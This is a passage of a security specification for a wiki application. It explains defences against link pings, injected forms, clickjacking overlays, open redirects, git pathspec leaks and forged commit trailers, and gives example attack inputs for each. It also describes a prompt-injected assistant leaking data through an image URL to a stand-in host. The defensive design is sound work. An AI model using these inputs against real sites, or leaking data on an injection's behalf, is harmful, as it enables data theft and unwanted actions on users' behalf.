A browser ends tags and quoted values by its own rules: in `<iframe a=b' srcdoc=…>` the quote belongs to `a`'s value, and a pattern that read it otherwise would let the attribute through.

#### A link's ping is renamed

A link's `ping` becomes `data-defused-ping`, wherever `ping` is a name of its own followed by `=` (not `data-ping=` or `mapping=`).
A followed link posts to each URL in its `ping`, same-origin and with the viewer's cookie (Chromium and Safari send pings by default).
So `<a href="/page/index" ping="/delete/plans">Read on</a>` would delete a page with the click that reads on.

The request checks also refuse a ping that gets past the render (403 "A link's ping changes nothing"; `isPing` in `go/security.go`): a request with a `Ping-To` or `Ping-From` header, or of type `text/ping`.

#### A diagram makes no form either

Mermaid's labels are HTML, which its `strict` level cleans with DOMPurify's defaults, and those keep `form`, `input`, `button` and `action`.
A label `<form method='post' action='/delete/…'>` would post to Zone with one click, in a page, a preview, a task's notes or comments.

So the labels are cleaned of form controls, `meta`, `base`, `link`, `script`, frames, `style`, ids and names (`dompurifyConfig` in `js/figures.js`, kept from a diagram's own settings by `secure`).
What of these the drawn SVG has anyway is taken out before it goes into the page (`defuseDiagram`).

#### A click submits only a form Zone put there

This is the line behind the ones above (`js/forms.js`, before any of Zone's own handlers, in the capture phase).
A submit is cancelled:

- **from a `<dialog>` that isn't open.**
  A page's own `<style>` could show the page's closed Delete dialog and lay its button over the whole page, transparent, so the reader's next click anywhere deleted the page.
  CSS can show a dialog but not open it.
- **from a form inside what Zone renders from text** (`[data-rendered]`: a page's article, the editor's and search's previews, a task's notes and comments, a slide, a diagram, the side column's headings).
  The exception is a form of Zone's own task lists there, in the list's own elements: the list, its dialogs, its no-list line.
  Their ids start with `tasks-app`, `task-` or `tasks-no-list`, which a page's ids can't (A page's ids and names are its own, below), nor a diagram's.

#### A task's text has no style element

A page's `<style>` styles that page.
A task's notes and comments go with the task onto every page that shows its list, the reader's own among them.
So a `<style>` there shows as text (`Env.NoStyle`, `renderNotes`); inline `style=` stays.

#### A page's ids and names are its own

Zone's scripts find their elements by id (`getElementById`), and the browser makes globals of names (`window.katex`).
So an element in a page that came first with one of Zone's ids would stand in for Zone's: a `<data id="task-edit-id" value="…">` would aim the task dialog's save at another task.

So in a page's raw HTML, and in task descriptions and comments, every `id` and `name` gets `user-content-` in front (`idRE` in `go/markdown.go`).
That holds wherever the name stands on its own before `=` (after HTML's whitespace, a `/` or a quote), so not `?id=` in a URL or `data-id=`, as `ping` is found.
A diagram's labels have none (A diagram makes no form either, above).
A `#link` to one finds it all the same (`hashTarget` in `js/util.js`).

#### Nothing takes the rendered HTML apart

The defusing holds for the HTML as it is rendered.
Taking a tag out of it joins what was on either side, which the defusing never saw: `<<a>form` comes out a form, `src<a>doc=` an `srcdoc`, `<<a>meta` a refresh to another site.
So the side column's table of contents is made from the parsed headings (`tocLabel`, Left: On this page in `docs/spec/routes.md`), not cut out of the article with its links taken out by a pattern.

### A page loads nothing from other hosts

`default-src 'self'` and the directives beside it (The policy, above) stop it.
An image, frame, stylesheet or font on another host is a request whose address the page's writer chose, and so a way to send text away with no script at all.
An assistant that read a prompt injection writes `![](https://elsewhere.example/?<what it read>)`, and the reader's browser delivers it on opening the page.
A frame from elsewhere can show a sign-in form that isn't Zone's.

- **A markdown image on another host is shown as a link to it** (`blockedImage` in `go/markdown.go`: `<a class="external-image">` with the alt text, or the address), not as a broken image.
  Raw HTML naming another host is just not loaded.
- **Inline styles stay** (a page's own `style=`, KaTeX's, Mermaid's): a `url()` in one is an image, so under `img-src`.
- **`<link>` in a page's raw HTML shows as text** (`defusedTagRE`): `rel=dns-prefetch` makes the browser look a host name up, which no policy stops.
  And every response says `X-DNS-Prefetch-Control: off`, so the browser doesn't look up the hosts of a page's links on its own either.
- **`Referrer-Policy: same-origin`** on every response: what a page does load from elsewhere isn't told which page asked.
- **`external-content`** (the settings file) names hosts that images, media and frames may come from all the same: `upload.wikimedia.org, *.example.org`, or `*` for any (`Settings.loadsFrom`).
  It takes host names only (`externalRE`), so the setting can't add a rule to the policy.
  Scripts, styles and fonts never come from elsewhere.
- **Links stay links**: following one is the reader's own doing.

Tests: `TestProduction` in `tests/test_routes.py`, `test_a_page_asks_no_other_host_for_anything` in `tests/e2e/test_security.py` (whose harness fails on any request to another host).

### Framing

Nothing frames a view of Zone's, against clickjacking: `frame-ancestors 'none'` in the policy (added to an existing one) and `X-Frame-Options: DENY` (`contentPolicy`).
That holds for another site and for Zone's own pages too, whose raw HTML may hold an `<iframe>` and inline styles: a transparent `/admin` or `/changes`, where one click removes a user or undoes a change, laid over a decoy.

Uploads are the exception (`frameableBySelf`, in `serveUploadFile`): a page may show a PDF, a picture or a text file in an `<iframe>`.
So an upload's response has `frame-ancestors 'self'` and `X-Frame-Options: SAMEORIGIN`, and an SVG's sandbox policy gets the same added.

The same trick without a frame, a page's `<style>` laying one of Zone's own dialogs (closed, in the same page) over a decoy, finds its submit cancelled (A click submits only a form Zone put there, above).

## Untrusted input

### A redirect goes only to Zone's own paths

Where a request says where to go after (the login's `?next=`, Delete's `next`), Zone goes there only when it is a path of its own (`isLocalPath`).
It starts with one `/`, and has no control character, whitespace or backslash anywhere.
Anything else goes to `/` (Delete's to the home page).

A browser reads `//elsewhere.example` as another site, drops tabs and line breaks from an address (`/<tab>/elsewhere.example` is `//elsewhere.example`), and reads `\` as `/`.
So a link to the login page with such a `next` would send whoever signs in on to a page that only looks like Zone's.

The other redirects build their target from a page's or a list's name (`pathURL`, `listHref`), and OAuth's answer goes only to a redirect URI its client registered (OAuth for `/mcp`, above).

### A page's name is never a pattern to git

A page may be called anything a file may, such as `*`, `p?` or `:(glob)**/x`: the editor's routes take the slug as it is (but no line break: A name holds no line break, below).
Git reads a path it is handed as a pathspec, where such a name matches other files.
`git show <sha> -- '*.md'` is every page's diff, another user's private pages among them, and likewise a page's log, its uncommitted changes and the commit that deleted it.

So every git Zone runs has `GIT_LITERAL_PATHSPECS=1` (git's `--literal-pathspecs`, in the environment `go/internal/gitrepo` gives it): a path names that one file.
Two calls turn it off: `grepPages`, whose `*.md` is Zone's own pattern, and `check-ignore`, which takes names as they are and refuses the setting.
`tests/test_privacy.py` asks for the history, versions, changes and deleted page of names that match alice's files.

### A name holds no line break

A page's name may hold anything a file's may but a control character or a backslash, and doesn't start with a double quote (`safePath` refuses it to every route and tool, `mdtext.BadNameRune`).
Nor does an upload's name (`uploadName`) or a list's (`checkListName`).
A page so named on disk, made by hand, isn't opened by Zone.

A name goes into a commit message as it is ("Update <slug>").
A line break in it would start the message's next lines, where git reads trailers.
The trailer is what says that an assistant wrote a commit (Which assistant in `docs/spec/mcp.md`), so a page saved as `notes⏎⏎Assistant: Claude` would show in Changes as an assistant's work through Claude.

Git also quotes such a name where it lists files, which the history's readers hide (Git's lists of files are read as they are, below).
Test: `test_no_name_starts_a_commit_messages_next_line` in `tests/test_changes.py`.

### Git's lists of files are read as they are

Where git lists the files of commits, Zone has it print them with `-z` (`logRecords` in `go/gitstore.go`), so a name comes as the file's own, whatever it holds.
That is Changes and the tool `history`, a page's history across a rename, the deleted pages, and what Undo looks at.

Without `-z`, git quotes a name with a letter outside ASCII, a quote, a backslash or a control character (`"private/alice/_assets/K\303\274ndigung.pdf"`).
That text, read as a path, starts with no private folder, so Changes would show other users' private files, groups' files and the folders of lists for some so named to everyone.

- **What isn't a clean path is no one's to see** (`cleanPath` in `canSeePath`: relative, no part empty, `.` or `..`, no control character or backslash, not starting with a double quote).
  So a slip in reading git's output hides a file rather than showing it.
- **A commit starts in that output only after a NUL**, which no message holds, so a subject can't start another commit in the list.
- **A commit message names a file its reader may not see as "a private page" or "a group's page"**, whole (`hideNames`).
  That is the commit's own such files by their names, whatever those hold (a space, a comma, a parenthesis), and any other path in such a folder, in any script's letters.
  Such a name goes on past a space until a word that goes on with the message (` to `, ` (MCP)` …).

`tests/test_privacy.py`, `tests/test_group_pages.py` and `tests/test_group_lists.py` hold such names in what they probe.

### A task snapshot's ids and times

A task snapshot's ids and times are checked (`sanitizeSnapshot` in `go/tasklogic.go`), on `POST /api/tasks/restore` and `/api/tasks/import`:

| Field | Allowed | Otherwise |
|-------|---------|-----------|
| `id`, `spawned_from` | Letters, digits, `-` and `_`, at most 64 | A new id, no `spawned_from` |
| `created_at`, `closed_at` | As `timestamp()` writes them, or a day alone | Now |
| A comment's id | As `id` | A new one |
| `by` on a comment or history entry | What could be a user's name | No one |

The browser builds the task cards from these, so markup in them would be an element on every user's task list, a form among them (the same one click as a form in a page).
The cards escape them as well (`esc()` in `public/js/taskrender.js`), as a tasks file written by hand may hold anything.

**Nobody is brought in by a snapshot.**
With users, a `by` other than the sender's own stays only on what Zone has seen under that name (`checkBy`, `checkArrived` in `go/taskby.go`; Who made a change in `docs/spec/users.md`).
Else a user could restore or import a task with a comment "by" a colleague.
And Zone keeps only what it has had:

- its assignee is one of its list's members, as for any write;
- a history entry Zone hasn't had for the task names no one but the sender, not whom it was given to, which would let it be given to them again (`hadAssignee`);
- its `spawned_from` stays only when the task comes back as Zone had it (the undo of a delete), as a `[[task:…]]` of a closed task stands for the task that names it as the occurrence before.

### Regexes from AI clients

A regex from an AI client can't hang the server.
`grep_wiki` runs `git grep` in its own process, killed after 10 s.
`replace_in_pages` matches with Go's RE2, which takes time linear in the text (no backtracking, so no lookarounds or backreferences; `replace_in_pages` in `docs/spec/mcp.md`).

Nor can it read what its asker may not see.
Whether a regex matches, fails or takes long tells what it read, so `grep_wiki`'s engine is handed only the folders its asker sees (`seenFolders`), never the whole wiki with the hits filtered after.
A failure while matching is said without git's words (`grep_wiki` in `docs/spec/mcp.md`).
`replace_in_pages` reads only the pages its asker may write.

## Throttling

Wrong passwords and wrong MCP tokens are throttled per client, and counted for each account a try was for (`Throttle`, in memory).
The account is the user name the login form names, or whose password Change password, Connect an assistant and OAuth's Allow ask for; `""` for what names no one (the wiki's one password, a token, a code, a link).

| Rule | Numbers |
|------|---------|
| Free tries for an account | 5 failures in a row |
| Then each try waits | 1 minute, doubling up to an hour (429; the login page says how long, `/mcp` sends `Retry-After`) |
| One account, guessed from one client | 33 guesses in the first day (`TestGuessesInADay`) |
| A client's total over all accounts | Past 20, every try waits as above; drops by one an hour |
| Many names, guessed from one client | 49 guesses in the first day, one an hour after |
| Forgotten | An account's count a day after its last wrong try, a client's total once it is down to none (`Throttle.failed` sweeps them); all at a restart |

A success clears that account's count and no other, so signing in as oneself between guesses at someone else's password forgets none of them.
The client's total is never cleared by a success.
There is no count of an account over all clients: anyone anywhere could then lock its user out, an admin too.
Secrets are compared as bytes (`sameSecret`), so non-ASCII passwords work.

### Three counts

Each with the same numbers (`newThrottle`):

| Count | What it counts |
|-------|----------------|
| The password's (`loginThrottle`) | The login page, Change password, a token made on Connect an assistant, Allow on OAuth's consent page |
| The token's (`mcpThrottle`) | `/mcp`, the file routes with a token, OAuth's `/oauth/token` |
| The welcome links' (`welcomeThrottle`) | A link that doesn't work (`/welcome/<token>`); a user name the sign-up link's form refuses, counted under that link |

So an assistant's mistakes don't lock its user's browser out.
Sign-up has caps of its own: 5 mails a client and 50 in all an hour (Sign-up in `docs/spec/users.md`).

### A few password checks at a time

A check, and a new password's hash, is 600,000 rounds of PBKDF2 on a core.
They run on at most half the cores at once, wiki-wide (`keySlots`, at least one).
So clients guessing from many addresses, each with its free tries, can't keep every core busy.
A try past the bound waits its turn, briefly, rather than fail.

A client's tries are also checked one at a time (`Throttle.try`: the wait, the check and the count as one step).
Otherwise tries sent at once would all be let in before the first counts as a failure, and a hundred connections would be a hundred guesses per wait.

### Who the client is

The client (`clientKey`) is the remote address, an IPv6 address by its /64 (`network`).
A client has that whole network to take addresses from, and each would otherwise have tries of its own.

**Behind a trusted proxy** (`trusted-proxies` in the settings file; unset: loopback), the client is the last `X-Forwarded-For` entry that isn't itself a trusted proxy: the one the proxy appended.
Entries before it are the client's to make up.
It is taken by its address alone (`forwardedAddr`):

- a port with it (`203.0.113.9:4711`, `[2001:db8::1]:4711`) is dropped, as it would make each connection a client of its own;
- an entry that is no address (`unknown`) counts as the hop that appended it, not as the entry before it, which the client wrote.

Anyone else's `X-Forwarded-For` is ignored.
A client on the LAN reaches Zone without a proxy, and could otherwise send a new one with every guess and never be throttled.

**On a Unix socket** (`--addr unix:PATH`, A Unix socket in `docs/spec/deployment.md`) the peer is the proxy, whatever `trusted-proxies` says (`onSocket`).
It has no address for the setting to name, and only what is on the machine and may reach the socket's path connects there.
Without the header it counts as `127.0.0.1`.

**An untrusted proxy**: a peer on a private network that sends the header without being trusted (likely a proxy in a container network, `172.17.0.1`) is named once in the log, with the `config set trusted-proxies` that trusts it.
Until then its clients count as one.

**Idle exit**: a Zone that exits when idle (`ZONE_IDLE_EXIT`, Started by systemd in `docs/spec/deployment.md`) stays up while a throttle remembers a wrong try (`Throttle.remembers`), so the count isn't lost to an exit.

## Limits

| What | Limit | Section |
|------|-------|---------|
| A request's body | 16 MB; an upload 100 MB or `upload-max` | Request bodies |
| What the wiki holds | `storage-max` | Storage limit in `docs/spec/users.md` |
| A search query | 500 characters, 32 words, 8 looked for as typos | Search queries |
| Connections | 100 at a time; a stalled one closed after 10 s (headers) or 60 s | Slow clients |

### Request bodies

Request bodies are capped (`checks`), so one request can't fill the server's memory or disk:

- at most 16 MB (`bodyMax`: a page, a task, an MCP call);
- an upload (`/api/upload`) 100 MB, or the settings' `upload-max` (`Settings.uploadMax`; reloaded with them, so a change needs no restart).

A body over it is refused with 413 (`Too large: at most 16 MB`, the size as `formatSize` writes it) on its `Content-Length`, before it is read.
One sent without a length (chunked) is cut at the limit (`http.MaxBytesReader`, `tooLarge`), and the routes that read whole bodies (the page writes, `/mcp`, the preview, the tasks API) answer that with 413 too.
What the whole wiki may hold is `storage-max` (Storage limit in `docs/spec/users.md`).

### Search queries

A search costs what a few words do (A query is a few words in `docs/spec/search.md`):

- a query is cut at 500 characters;
- it ranks by at most 32 distinct words;
- only 8 of those that match nothing are looked for as typos, each among every word of the index;
- with semantic search the tokenizer stops at the model's 512 tokens and costs n log n in a word's length.

Without these limits one GET of `/api/search` as long as an address may be (a megabyte, which a public wiki's visitor reaches) would keep a processor busy for hours, as there is no limit on the time a route takes (Slow clients, below).

### Slow clients

A client that stands still doesn't hold a connection (`noStalls` in `go/stalls.go`, around every route).
Zone serves at most 100 connections at a time (`limitListener`), so a hundred clients that sent half a request and then nothing, or asked for a large file and never read it, would otherwise take all of them.

| What | Time |
|------|------|
| A request's headers | 10 s (`ReadHeaderTimeout`) |
| A connection between requests | 60 s (`IdleTimeout`) |
| Each read of a request's body, each write of a response | 60 s (`stallTime`; `steadyBody`, `steadyWriter`, a deadline set anew each time) |
| A body a route never reads | 60 s from the request's start |

One that gets nowhere fails, and the connection is closed.
There is no limit on the whole request: a large upload or download over a slow line takes as long as it takes, while it moves.
Nor is there one on what a route does between reading and answering (a search, a git command).

This ends stalled connections, the forgotten and the careless.
A client that sends a byte a minute on a hundred connections still holds them: on a wiki open to the internet, that is the reverse proxy's to limit.
Tests: `go/stalls_test.go`.

## Supply chain

### No secrets in the repo

`.env` (tokens, password) is gitignored.
A pre-commit hook (`.githooks/pre-commit`, gitleaks) refuses a commit with a secret in it, and CI's **leaks** job scans every commit (`./run.sh leaks`; Secret scanning in `docs/spec/testing.md`).

### CI runs no stranger's code with the host's engine

Forgejo's runner gives its jobs the host engine's socket, which is root on the host, and the image job pushes with the registry's token from there (Forgejo's runner in `docs/spec/deployment.md`).
So a pull request from another repository (a fork) runs no job there.
The checks run only for a push, a run started by hand, or a pull request from a branch of the repository itself (`if:` in `.forgejo/workflows/ci.yml`), and the jobs after them need them.

GitHub's runners are machines of their own per job, and a pull request's job gets no secret and a token that only reads, so the same checks run there for every pull request.
Test: `test_forgejo_runs_no_forks_code` in `tests/test_image.py`.

### What builds Zone is named by hash

A tag is a name its publisher, or whoever took over their account, can move to other content.
The CI that follows it builds and pushes the image every NAS pulls, with the registry's token.
So what builds Zone is named by hash:

- **the base images by digest**, each the tag's multi-arch index: `ARG UBUNTU=ubuntu:26.04@sha256:…` in the `Containerfile`, used by its three stages; the Playwright image in `Containerfile.tools`; the job container `docker:…-cli@sha256:…` in `.forgejo/workflows/ci.yml`;
- **every CI action by its commit**, in both workflows: `uses: actions/checkout@<40 hex> # v4.4.0`;
- **Go, gitleaks, onnxruntime and the model**, by version and SHA-256 (Dependencies in `AGENTS.md`).

One thing is not: on GitHub `docker/setup-buildx-action` (pinned by its commit) starts BuildKit from the `moby/buildkit` image by its tag (`buildx-stable-1`, its default).
So the builder of the published image is named by tag, not by hash.

The release binaries are built in the tools image with its pinned Go (Release binaries in `docs/spec/deployment.md`), and their sums are published beside them (`SHA256SUMS`).
The job attaches them with the runner's own `gh`, GitHub's tool on GitHub's runner image, which no workflow pins, rather than with another party's action.

A pin doesn't follow updates.
Bump the base images' digests now and then (the `Docker-Content-Digest` of the registry's manifest for the tag, or `skopeo inspect`), and an action's commit with its version comment.
Test: `test_base_images_and_ci_actions_are_pinned_by_hash` in `tests/test_image.py`.
